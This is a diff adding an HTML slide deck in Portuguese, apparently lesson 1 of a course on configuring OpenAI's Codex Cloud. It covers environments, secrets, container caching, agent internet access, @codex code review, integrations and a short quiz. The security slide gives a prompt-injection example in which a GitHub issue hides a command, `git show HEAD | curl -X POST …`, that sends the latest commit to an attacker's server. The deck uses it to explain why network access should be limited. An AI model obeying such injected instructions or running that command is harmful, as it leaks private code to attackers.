@@ -1,0 +1,361 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<title>A Interface Codex Cloud</title>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;1,9..144,600&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#171310; --surface:#1F1A15; --surface-2:#271F18;
+  --border:#3A2F24; --border-2:#4A3C2D;
+  --ink:#F3ECE2; --muted:#AE9F8C;
+  --accent:#DE8B62; --accent-ink:#F0AB86; --accent-soft:#3A281F;
+  --good:#8FC0A8; --good-soft:#243128;
+  --warn:#DDB662; --warn-soft:#362A16;
+  --danger:#DE8A80; --danger-soft:#3A2321;
+  --mono:'IBM Plex Mono', ui-monospace, monospace;
+  --display:'Fraunces', Georgia, serif;
+  --body-f:'Inter', system-ui, sans-serif;
+}
+@page{ size:960pt 540pt; margin:.5in .55in; background:#171310 }
+*{box-sizing:border-box}
+html,body{background:var(--bg);color:var(--ink);margin:0;-webkit-print-color-adjust:exact;print-color-adjust:exact}
+body{font-family:var(--body-f);font-size:13px;line-height:1.5}
+.wrap{max-width:920px;margin:0 auto}
+section.block{page-break-before:always;break-before:page}
+section.block:first-child{page-break-before:auto;break-before:auto}
+
+/* cabeçalho de página */
+.pagehead{display:flex;justify-content:space-between;font-family:var(--mono);font-size:9.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);border-bottom:1px solid var(--border);padding-bottom:6px;margin-bottom:14px}
+.pagehead .n{color:var(--accent-ink)}
+h2{font-family:var(--display);font-weight:600;font-size:25px;line-height:1.2;margin:0 0 6px}
+h2 em{color:var(--accent-ink);font-style:italic}
+.intro{color:var(--muted);margin:0 0 14px;font-size:13px;max-width:780px}
+strong{color:var(--ink);font-weight:600}
+code{font-family:var(--mono);font-size:.86em;background:var(--accent-soft);color:var(--accent-ink);padding:1px 5px;border-radius:4px}
+
+/* capa */
+.cover{min-height:600px;display:flex;flex-direction:column;justify-content:center}
+.eyebrow{font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-ink);display:flex;align-items:center;gap:8px;margin-bottom:16px}
+.eyebrow .dot{width:10px;height:10px;border-radius:50%;background:var(--accent-soft);border:1px solid var(--accent)}
+.cover h1{font-family:var(--display);font-weight:600;font-size:52px;line-height:1.08;margin:0 0 16px}
+.cover h1 em{color:var(--accent-ink);font-style:italic}
+.lead{color:var(--muted);font-size:15px;max-width:640px;margin:0 0 18px}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chips span{font-family:var(--mono);font-size:10.5px;background:var(--accent-soft);color:var(--accent-ink);border:1px solid var(--border-2);padding:4px 11px;border-radius:999px}
+.byline{font-family:var(--mono);font-size:10px;color:var(--muted);margin-top:26px}
+
+/* grids e cards */
+.grid{display:grid;gap:12px}
+.g2{grid-template-columns:1fr 1fr}.g3{grid-template-columns:repeat(3,1fr)}.g4{grid-template-columns:repeat(4,1fr)}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:12px 14px}
+.card h3{font-size:13.5px;font-weight:600;margin:0 0 5px;color:var(--ink)}
+.card p{margin:0;color:var(--muted);font-size:12px}
+.card .k{font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent-ink);margin-bottom:4px}
+
+/* passos */
+.steps{display:grid;gap:9px}
+.step{display:grid;grid-template-columns:30px 1fr;gap:12px;align-items:start;background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:10px 14px}
+.step .b{width:26px;height:26px;border-radius:50%;background:var(--accent);color:#171310;font-family:var(--mono);font-weight:600;font-size:12px;display:flex;align-items:center;justify-content:center}
+.step h3{font-size:13.5px;margin:0 0 2px;font-weight:600}
+.step p{margin:0;color:var(--muted);font-size:12px}
+
+/* terminal */
+.term{background:#100D0A;border:1px solid var(--border);border-radius:10px;padding:11px 14px;font-family:var(--mono);font-size:11.3px;line-height:1.55;white-space:pre-wrap;color:var(--ink);margin:0}
+.term .c{color:var(--muted)}
+.term-title{font-family:var(--mono);font-size:9.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:0 0 6px}
+
+/* tabelas */
+.table-wrap{border:1px solid var(--border);border-radius:10px;overflow:hidden}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th{background:var(--surface-2);font-family:var(--mono);text-transform:uppercase;font-size:9.5px;letter-spacing:.08em;color:var(--muted);text-align:left;padding:8px 12px;font-weight:500}
+td{border-top:1px solid var(--border);padding:8px 12px;vertical-align:top;background:var(--surface)}
+td:first-child{font-weight:600}
+
+/* callouts e listas */
+.callout{border:1px solid var(--border-2);background:var(--accent-soft);border-radius:10px;padding:10px 14px;font-size:12.3px;margin-top:12px}
+.callout.good{background:var(--good-soft);border-color:#35493B}
+.callout.warn{background:var(--warn-soft);border-color:#54421F}
+.callout.danger{background:var(--danger-soft);border-color:#5A3431}
+.bullets{list-style:none;padding:0;margin:0}
+.bullets li{position:relative;padding-left:17px;margin:5px 0;font-size:12.3px;color:var(--ink)}
+.bullets li::before{content:"●";position:absolute;left:0;top:.15em;color:var(--accent);font-size:.7em}
+.checklist{list-style:none;padding:0;margin:0}
+.checklist li{position:relative;padding-left:20px;margin:6px 0;font-size:12.5px}
+.checklist li::before{content:"✓";position:absolute;left:0;color:var(--good);font-weight:700}
+
+/* quiz */
+.qcard{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:12px}
+.qtext{font-weight:600;font-size:13.3px;margin:0 0 9px}
+.opts{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.opts div{border:1px solid var(--border);background:var(--surface-2);border-radius:7px;padding:6px 10px;font-size:12px}
+.answer{margin-top:9px;background:var(--good-soft);border:1px solid #35493B;border-radius:7px;padding:7px 11px;font-size:12px}
+.answer b{color:var(--good)}
+
+.next{font-family:var(--mono);font-size:11px;color:var(--accent-ink);margin-top:22px}
+.source{font-family:var(--mono);font-size:9.5px;color:var(--muted);margin-top:14px;line-height:1.6}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- CAPA -->
+<section class="block">
+  <div class="cover">
+    <div class="eyebrow"><span class="dot"></span>Instalação e configuração do Codex · Aula 1</div>
+    <h1>A interface<br><em>Codex Cloud</em></h1>
+    <p class="lead">Como delegar tarefas de código ao agente da OpenAI rodando em ambientes isolados na nuvem, com várias tarefas em paralelo, revisando o diff e abrindo pull requests direto pelo navegador em chatgpt.com/codex.</p>
+    <div class="chips"><span>chatgpt.com/codex</span><span>Environments</span><span>Tarefas em paralelo</span><span>Code review</span><span>GitHub · Slack · Linear</span></div>
+    <div class="byline">Formação Claude Code 2026 · Baseado na documentação oficial do Codex (consulta em set/2026)</div>
+  </div>
+</section>
+
+<!-- 01 -->
+<section class="block">
+  <div class="pagehead"><span>Conceito</span><span class="n">01</span></div>
+  <h2>O que é o <em>Codex Cloud</em></h2>
+  <p class="intro">O Codex é o agente de programação da OpenAI. Ele existe em várias superfícies: CLI, extensão de IDE, app desktop e a <strong>interface web (Codex Cloud)</strong>. Na nuvem, cada tarefa roda num container próprio, com o seu repositório clonado, e não usa a sua máquina.</p>
+  <div class="grid g3">
+    <div class="card"><div class="k">Paralelismo</div><h3>Trabalho em segundo plano</h3><p>Você delega tarefas longas, cada uma no seu ambiente dedicado, e segue trabalhando em outra coisa enquanto elas rodam.</p></div>
+    <div class="card"><div class="k">Reprodutibilidade</div><h3>Ambiente configurado</h3><p>Dependências, ferramentas, variáveis e scripts de setup ficam salvos por repositório. Toda tarefa começa do mesmo ponto.</p></div>
+    <div class="card"><div class="k">Controle</div><h3>Revisar antes do merge</h3><p>O resultado chega como resumo + diff. Você pede ajustes (follow-up) ou abre um pull request quando estiver pronto.</p></div>
+  </div>
+  <h3 style="font-family:var(--display);font-size:16px;margin:18px 0 8px">Quando usar a nuvem em vez da CLI/IDE local</h3>
+  <div class="grid g2">
+    <ul class="bullets">
+      <li><strong>O trabalho pode rodar em background:</strong> delegue e volte quando houver algo para revisar.</li>
+      <li><strong>Você quer comparar várias tentativas</strong> sem ocupar sua máquina local.</li>
+    </ul>
+    <ul class="bullets">
+      <li><strong>A tarefa nasce no GitHub, GitLab, Linear ou Slack:</strong> as integrações disparam o Codex sem sair da ferramenta.</li>
+      <li><strong>Você está longe da máquina de desenvolvimento:</strong> dá para iniciar e revisar pelo navegador ou pelo celular.</li>
+    </ul>
+  </div>
+</section>
+
+<!-- 02 -->
+<section class="block">
+  <div class="pagehead"><span>Primeiros passos</span><span class="n">02</span></div>
+  <h2>Configurando o Codex Cloud em <em>5 passos</em></h2>
+  <p class="intro">O fluxo inicial é sempre o mesmo: conta ChatGPT, repositório conectado, environment criado e a primeira tarefa.</p>
+  <div class="grid g2" style="grid-template-columns:1.25fr 1fr;align-items:start">
+    <div class="steps">
+      <div class="step"><div class="b">1</div><div><h3>Abra o Codex e faça login</h3><p>Acesse <code>chatgpt.com/codex</code> com a sua conta do ChatGPT.</p></div></div>
+      <div class="step"><div class="b">2</div><div><h3>Conecte GitHub ou GitLab (Beta)</h3><p>No GitHub, escolha quais repositórios o Codex pode acessar. No GitLab, o projeto é selecionado ao criar o environment.</p></div></div>
+      <div class="step"><div class="b">3</div><div><h3>Crie um environment</h3><p>Em <code>Settings → Environments</code>, associe o repositório e configure dependências, ferramentas, variáveis e secrets.</p></div></div>
+      <div class="step"><div class="b">4</div><div><h3>Inicie a primeira tarefa</h3><p>Volte ao Codex, escolha o environment e descreva o resultado desejado. Acompanhe os logs ou deixe rodando em background.</p></div></div>
+      <div class="step"><div class="b">5</div><div><h3>Revise o resultado</h3><p>Leia o resumo e o diff, peça ajustes ou abra um pull request.</p></div></div>
+    </div>
+    <div>
+      <div class="card"><div class="k">Quem tem acesso</div><p style="color:var(--ink)">O Codex Cloud faz parte dos planos do ChatGPT. As integrações em nuvem (code review, Slack, Linear) exigem plano pago: <strong>Plus, Pro, Business, Enterprise ou Edu</strong>.</p></div>
+      <div class="callout warn">Usando o Codex só com <strong>chave de API</strong>, você tem CLI, SDK e extensão de IDE, mas <strong>não</strong> os recursos de nuvem (code review no GitHub, Slack etc.).</div>
+      <div class="callout">No Enterprise, o administrador do workspace precisa habilitar as tarefas em nuvem do Codex nas configurações do workspace.</div>
+    </div>
+  </div>
+</section>
+
+<!-- 03 -->
+<section class="block">
+  <div class="pagehead"><span>Por dentro</span><span class="n">03</span></div>
+  <h2>O ciclo de vida de uma <em>tarefa na nuvem</em></h2>
+  <p class="intro">Entender o que acontece depois que você envia o prompt ajuda a configurar bem o environment e a diagnosticar falhas.</p>
+  <div class="grid g2" style="grid-template-columns:1.3fr 1fr;align-items:start">
+    <div class="steps">
+      <div class="step"><div class="b">1</div><div><h3>Container + checkout</h3><p>O Codex cria um container e faz checkout do repositório no branch ou commit SHA selecionado.</p></div></div>
+      <div class="step"><div class="b">2</div><div><h3>Setup script</h3><p>Roda o script de setup e, ao retomar um container em cache, o script de manutenção (opcional).</p></div></div>
+      <div class="step"><div class="b">3</div><div><h3>Regras de internet</h3><p>O setup roda <strong>com</strong> internet. Na fase do agente, a internet fica <strong>desligada por padrão</strong>.</p></div></div>
+      <div class="step"><div class="b">4</div><div><h3>Loop do agente</h3><p>O agente executa comandos no terminal em ciclo: edita código, roda checagens e tenta validar o próprio trabalho.</p></div></div>
+      <div class="step"><div class="b">5</div><div><h3>Resposta + diff</h3><p>Ao terminar, mostra a resposta e o diff dos arquivos alterados. Daí você abre um PR ou faz perguntas de follow-up.</p></div></div>
+    </div>
+    <div>
+      <div class="card"><div class="k">AGENTS.md</div><h3>O "manual" do repositório</h3><p>Se o repositório tiver um arquivo <code>AGENTS.md</code>, o agente o usa para descobrir os comandos de lint e de teste específicos do projeto. É o equivalente ao <code>CLAUDE.md</code> no Claude Code.</p></div>
+      <div class="term-title" style="margin-top:12px">Exemplo mínimo de AGENTS.md</div>
+<pre class="term"><span class="c"># AGENTS.md</span>
+## Testes
+- Rode `pytest -q` antes de concluir.
+
+## Lint
+- Use `ruff check .` e corrija os avisos.</pre>
+    </div>
+  </div>
+</section>
+
+<!-- 04 -->
+<section class="block">
+  <div class="pagehead"><span>Environments</span><span class="n">04</span></div>
+  <h2>Configurando o <em>environment</em></h2>
+  <p class="intro">O environment define o que o Codex instala e executa. A configuração fica em <code>chatgpt.com/codex/settings/environments</code>.</p>
+  <div class="grid g2" style="align-items:start">
+    <div>
+      <div class="card" style="margin-bottom:10px"><div class="k">Imagem padrão</div><h3>universal</h3><p>O agente roda na imagem <code>universal</code>, com as linguagens e ferramentas mais comuns já instaladas. Em <strong>Set package versions</strong> você fixa versões de Python, Node.js e outros runtimes. A referência pública é o repositório <code>openai/codex-universal</code>.</p></div>
+      <div class="table-wrap"><table>
+        <tr><th>Tipo</th><th>Disponível em</th><th>Detalhe</th></tr>
+        <tr><td>Variáveis de ambiente</td><td>Setup e agente</td><td style="color:var(--muted)">Valem durante toda a tarefa.</td></tr>
+        <tr><td>Secrets</td><td>Só no setup</td><td style="color:var(--muted)">Criptografia extra; <strong>removidos antes da fase do agente</strong>.</td></tr>
+      </table></div>
+    </div>
+    <div>
+      <div class="card" style="margin-bottom:10px"><div class="k">Setup automático</div><p style="color:var(--ink)">Para <code>npm</code>, <code>yarn</code>, <code>pnpm</code>, <code>pip</code>, <code>pipenv</code> e <code>poetry</code>, o Codex instala as dependências sozinho.</p></div>
+      <div class="term-title">Setup manual (projetos mais complexos)</div>
+<pre class="term"><span class="c"># Instala o type checker</span>
+pip install pyright
+
+<span class="c"># Instala as dependências</span>
+poetry install --with test
+pnpm install</pre>
+      <div class="callout warn">O setup roda numa sessão Bash <strong>separada</strong> do agente: um <code>export</code> ali não chega ao agente. Para persistir variáveis, grave em <code>~/.bashrc</code> ou cadastre-as nas configurações do environment.</div>
+    </div>
+  </div>
+</section>
+
+<!-- 05 -->
+<section class="block">
+  <div class="pagehead"><span>Desempenho</span><span class="n">05</span></div>
+  <h2>Cache de container e <em>script de manutenção</em></h2>
+  <p class="intro">O Codex guarda o estado do container por até <strong>12 horas</strong>, o que acelera novas tarefas e follow-ups no mesmo environment.</p>
+  <div class="grid g2" style="align-items:start">
+    <div class="card"><div class="k">Ao criar o cache</div>
+      <ul class="bullets"><li>Clona o repositório e faz checkout do <strong>branch padrão</strong>.</li><li>Roda o setup script e salva o estado resultante do container.</li></ul></div>
+    <div class="card"><div class="k">Ao retomar o cache</div>
+      <ul class="bullets"><li>Faz checkout do branch escolhido para a tarefa.</li><li>Roda o <strong>script de manutenção</strong> (opcional), útil quando o setup rodou num commit antigo e as dependências mudaram.</li></ul></div>
+  </div>
+  <div class="grid g2" style="margin-top:12px;align-items:start">
+    <div class="card"><div class="k">Invalidação automática</div><p style="color:var(--ink)">O cache é descartado sozinho quando você altera o <strong>setup script</strong>, o <strong>script de manutenção</strong>, as <strong>variáveis</strong> ou os <strong>secrets</strong>. Se o repositório mudar de um jeito incompatível com o cache, use <strong>Reset cache</strong> na página do environment.</p></div>
+    <div class="callout warn" style="margin-top:0">Nos planos <strong>Business e Enterprise</strong>, o cache é <strong>compartilhado</strong> entre todos os usuários com acesso ao environment. Resetá-lo afeta todo o workspace.</div>
+  </div>
+  <div class="callout good">Regra prática: o setup instala tudo do zero, e a manutenção só atualiza (ex.: <code>pnpm install</code> ou <code>poetry install</code> de novo). Assim os follow-ups ficam rápidos e continuam corretos.</div>
+</section>
+
+<!-- 06 -->
+<section class="block">
+  <div class="pagehead"><span>Segurança</span><span class="n">06</span></div>
+  <h2>Acesso à <em>internet</em> do agente</h2>
+  <p class="intro">Por padrão, o agente <strong>não</strong> acessa a internet. O setup sempre tem acesso, para instalar dependências. A liberação é feita por environment, e todo tráfego de saída passa por um proxy HTTP/HTTPS.</p>
+  <div class="grid g3" style="align-items:start">
+    <div class="card"><div class="k">Modo</div><h3>Off / On</h3><p><strong style="color:var(--ink)">Off</strong> bloqueia tudo. <strong style="color:var(--ink)">On</strong> libera, com restrição por lista de domínios e por métodos HTTP.</p></div>
+    <div class="card"><div class="k">Allowlist de domínios</div><h3>Três presets</h3><p><strong style="color:var(--ink)">None</strong> (lista vazia), <strong style="color:var(--ink)">Common dependencies</strong> (npm, PyPI, GitHub, Docker…) ou <strong style="color:var(--ink)">All</strong> (sem restrição). Nos dois primeiros, dá para adicionar domínios.</p></div>
+    <div class="card"><div class="k">Métodos HTTP</div><h3>Somente leitura</h3><p>Restrinja a <code>GET</code>, <code>HEAD</code> e <code>OPTIONS</code>. Aí <code>POST</code>, <code>PUT</code>, <code>PATCH</code> e <code>DELETE</code> ficam bloqueados.</p></div>
+  </div>
+  <div class="grid g2" style="margin-top:12px;align-items:start">
+    <div class="callout danger" style="margin-top:0"><strong>Riscos de liberar a internet:</strong> prompt injection vindo de conteúdo não confiável, vazamento de código ou secrets, download de malware ou dependências vulneráveis e conteúdo com restrição de licença.</div>
+    <div class="callout" style="margin-top:0"><strong>Exemplo real de prompt injection:</strong> você pede "corrija a issue #123", e o texto da issue esconde uma instrução para rodar <code>git show HEAD | curl -X POST …</code>, enviando o último commit a um servidor do atacante. Por isso, limite domínios e métodos.</div>
+  </div>
+</section>
+
+<!-- 07 -->
+<section class="block">
+  <div class="pagehead"><span>Fluxo de trabalho</span><span class="n">07</span></div>
+  <h2>Da tarefa ao <em>pull request</em></h2>
+  <p class="intro">A interface web é organizada em torno de uma lista de tarefas: cada uma tem o seu log, o resumo final e o diff das alterações.</p>
+  <div class="grid g4">
+    <div class="card"><div class="k">1 · Escreva</div><h3>Prompt + environment</h3><p>Escolha o environment e o branch, e descreva o <strong style="color:var(--ink)">resultado esperado</strong>, não só a ação.</p></div>
+    <div class="card"><div class="k">2 · Acompanhe</div><h3>Logs ao vivo</h3><p>Veja os comandos que o agente roda, ou deixe a tarefa em background e siga para outra.</p></div>
+    <div class="card"><div class="k">3 · Revise</div><h3>Resumo + diff</h3><p>Confira o que mudou e as checagens que o agente executou. Peça ajustes com follow-ups na mesma tarefa.</p></div>
+    <div class="card"><div class="k">4 · Entregue</div><h3>Abrir PR</h3><p>Com o resultado aprovado, abra o pull request direto da interface e revise no GitHub como de costume.</p></div>
+  </div>
+  <div class="grid g2" style="margin-top:12px;align-items:start">
+    <div class="card"><div class="k">Várias tentativas (best-of-N)</div><p style="color:var(--ink)">Para problemas em aberto, peça <strong>mais de uma tentativa</strong> da mesma tarefa e compare as soluções lado a lado antes de escolher qual vira PR. Pela CLI, isso é o parâmetro <code>--attempts</code> (1 a 4).</p></div>
+    <div class="card"><div class="k">Boas práticas</div>
+      <ul class="checklist"><li>Uma tarefa = um objetivo verificável.</li><li>Diga como validar (qual teste deve passar).</li><li>Mantenha o <code>AGENTS.md</code> com os comandos do projeto.</li></ul></div>
+  </div>
+</section>
+
+<!-- 08 -->
+<section class="block">
+  <div class="pagehead"><span>GitHub</span><span class="n">08</span></div>
+  <h2>Code review com <em>@codex</em></h2>
+  <p class="intro">O Codex revisa pull requests como um colega: analisa o diff, segue as regras do repositório e publica um review focado só em problemas graves (<strong>P0 e P1</strong>).</p>
+  <div class="grid g2" style="align-items:start">
+    <div>
+      <div class="steps">
+        <div class="step"><div class="b">1</div><div><h3>Ative</h3><p>Em <code>chatgpt.com/codex/settings/code-review</code>, ligue <strong>Code review</strong> no repositório (exige permissão de push ou admin no GitHub).</p></div></div>
+        <div class="step"><div class="b">2</div><div><h3>Peça o review</h3><p>Comente <code>@codex review</code> no PR. O Codex reage com 👀 e publica a revisão.</p></div></div>
+        <div class="step"><div class="b">3</div><div><h3>Automatize (opcional)</h3><p>Com <strong>Automatic reviews</strong> ligado, todo PR novo é revisado sem precisar comentar.</p></div></div>
+      </div>
+    </div>
+    <div>
+      <div class="term-title">Comandos úteis em comentários de PR</div>
+<pre class="term">@codex review
+@codex review for issues in the database migration
+@codex fix the P1 issue
+@codex fix the CI failures
+@codex security review   <span class="c"># research preview</span></pre>
+      <div class="callout">Qualquer menção a <code>@codex</code> que não seja <code>review</code> abre uma <strong>tarefa na nuvem</strong> com o PR como contexto, e o Codex pode dar push da correção no branch.</div>
+      <div class="callout good">Personalize o review com uma seção <code>## Code Review Rules</code> no <code>AGENTS.md</code>. Regras gerais ficam no arquivo da raiz, e regras de um serviço num <code>AGENTS.md</code> dentro da pasta dele.</div>
+    </div>
+  </div>
+</section>
+
+<!-- 09 -->
+<section class="block">
+  <div class="pagehead"><span>Integrações</span><span class="n">09</span></div>
+  <h2>Disparando tarefas de <em>outros lugares</em></h2>
+  <p class="intro">As tarefas na nuvem também começam fora do navegador. As integrações são instaladas em <code>chatgpt.com/codex/settings/connectors</code>.</p>
+  <div class="grid g3" style="align-items:start">
+    <div class="card"><div class="k">Slack</div><h3>@Codex no canal</h3><p>Mencione <code>@Codex</code> com o pedido num canal ou thread. Ele lê a conversa, escolhe o environment mais adequado, responde com 👀 e um link e, no fim, posta o resultado.</p></div>
+    <div class="card"><div class="k">Linear</div><h3>Atribua a issue</h3><p>Atribua uma issue ao Codex como a um colega, ou mencione <code>@Codex</code> num comentário. Ele cria a tarefa e posta o progresso na issue.</p></div>
+    <div class="card"><div class="k">GitLab (Beta)</div><h3>Merge requests</h3><p>Conecte um projeto GitLab ao environment e use o Codex em merge requests e issues, inclusive para reviews.</p></div>
+  </div>
+  <div class="grid g2" style="margin-top:12px;align-items:start;grid-template-columns:1.2fr 1fr">
+    <div>
+      <div class="term-title">Pela CLI: comando codex cloud (experimental)</div>
+<pre class="term"><span class="c"># seletor interativo de tarefas e environments</span>
+codex cloud
+
+<span class="c"># envia uma tarefa direto, com 2 tentativas</span>
+codex cloud exec --env ENV_ID --attempts 2 "Corrija o teste que falha em utils"
+
+<span class="c"># lista as tarefas recentes (JSON para automação)</span>
+codex cloud list --json</pre>
+    </div>
+    <div class="callout" style="margin-top:0">No Slack, se o pedido for ambíguo, o Codex usa o <strong>environment usado mais recentemente</strong>, rodando no branch padrão do primeiro repositório do environment. Para ser preciso, cite o repositório, por exemplo <code>@Codex fix the above in org/repo</code>.</div>
+  </div>
+</section>
+
+<!-- QUIZ -->
+<section class="block">
+  <div class="pagehead"><span>Fixação</span><span class="n">10</span></div>
+  <h2>Teste <em>rápido</em></h2>
+  <div class="grid g2" style="align-items:start;margin-top:10px">
+    <div>
+      <div class="qcard">
+        <p class="qtext">1. Você cadastrou um token como <em>secret</em> no environment. Em qual fase ele fica disponível?</p>
+        <div class="opts"><div>A) Em toda a tarefa</div><div>B) Somente no setup script</div><div>C) Somente na fase do agente</div><div>D) Só em follow-ups</div></div>
+        <div class="answer"><b>B.</b> Secrets só existem no setup e são removidos antes da fase do agente. Variáveis de ambiente valem na tarefa inteira.</div>
+      </div>
+      <div class="qcard">
+        <p class="qtext">2. Qual é o comportamento padrão de internet na fase do agente?</p>
+        <div class="opts"><div>A) Liberada para todos os domínios</div><div>B) Só "Common dependencies"</div><div>C) Desligada</div><div>D) Só métodos GET</div></div>
+        <div class="answer"><b>C.</b> O acesso do agente é desligado por padrão. Só o setup tem internet para instalar dependências.</div>
+      </div>
+    </div>
+    <div>
+      <div class="qcard">
+        <p class="qtext">3. Você alterou o setup script do environment. O que acontece com o cache do container?</p>
+        <div class="opts"><div>A) Continua valendo por 12 h</div><div>B) É invalidado automaticamente</div><div>C) Precisa de Reset cache manual</div><div>D) Só expira no dia seguinte</div></div>
+        <div class="answer"><b>B.</b> Mudar setup, manutenção, variáveis ou secrets invalida o cache sozinho. O Reset cache manual serve para mudanças incompatíveis no repositório.</div>
+      </div>
+      <div class="qcard">
+        <p class="qtext">4. Onde você define regras próprias para o code review do Codex?</p>
+        <div class="opts"><div>A) No README.md</div><div>B) Na descrição do PR</div><div>C) Em "## Code Review Rules" no AGENTS.md</div><div>D) No arquivo .github/CODEOWNERS</div></div>
+        <div class="answer"><b>C.</b> O Codex procura arquivos AGENTS.md e aplica as regras da raiz mais as do arquivo mais próximo do código alterado.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ENCERRAMENTO -->
+<section class="block">
+  <div class="cover" style="min-height:560px">
+    <div class="eyebrow"><span class="dot"></span>Recapitulando</div>
+    <h1 style="font-size:40px">Delegue, acompanhe<br>e <em>revise o diff</em></h1>
+    <p class="lead">O Codex Cloud roda tarefas em containers isolados, a partir de um environment configurado para o seu repositório. Você controla as dependências, os secrets e o acesso à internet, e recebe resumo + diff para revisar, pedir ajustes ou abrir o PR. As mesmas tarefas também podem começar pelo GitHub, Slack, Linear ou pela CLI.</p>
+    <div class="chips"><span>Environment + AGENTS.md</span><span>Internet off por padrão</span><span>Cache de 12 h</span><span>@codex review</span><span>codex cloud</span></div>
+    <div class="next">Próxima aula → A interface do aplicativo desktop</div>
+    <div class="source">Fontes: developers.openai.com/codex/cloud · /cloud/environments · /cloud/internet-access · /integrations/github · /pricing · learn.chatgpt.com (Slack, Linear, CLI). Interface e planos podem mudar; confira a documentação oficial.</div>
+  </div>
+</section>
+
+</div>
+</body>
+</html>
